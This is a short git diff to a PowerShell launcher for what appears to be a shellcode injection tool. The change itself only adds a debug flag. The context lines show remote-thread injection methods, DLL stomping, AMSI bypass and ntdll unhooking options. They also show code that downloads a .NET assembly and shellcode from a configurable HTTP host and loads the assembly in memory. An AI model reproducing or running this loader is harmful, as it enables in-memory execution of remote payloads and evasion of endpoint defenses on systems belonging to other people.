@@ -82,6 +82,9 @@ $T = "True"
 # [/unhook] unhook ntdll.dll ("True" / "False")
 $U = "False"
 
+# [/debug] print debug messages ("True" / "False")
+$V = "False"
+
 # --------------------------------------------------------------------
 
 $methods = @("remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspended")
@@ -103,7 +106,7 @@ if ($methods.Contains($A)) {
     }
 }
 
-$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /fluctuate:${J} /image:${K} /pid:${L} /ppid:${M} /dll:${N} /stompDll:${O} /stompExport:${P} /sleep:${Q} /blockDlls:${R} /am51:${S} /remoteAm51:${T} /unhook:${U}"
+$cmd = "${A} /sc:http://${B}:${C}/${E} /p:${F} /protect:${G} /timeout:${H} /flipSleep:${I} /fluctuate:${J} /image:${K} /pid:${L} /ppid:${M} /dll:${N} /stompDll:${O} /stompExport:${P} /sleep:${Q} /blockDlls:${R} /am51:${S} /remoteAm51:${T} /unhook:${U} /debug:${V}"
 
 $data = (IWR -UseBasicParsing "http://${B}:${C}/${D}").Content
 $assem = [System.Reflection.Assembly]::Load($data)
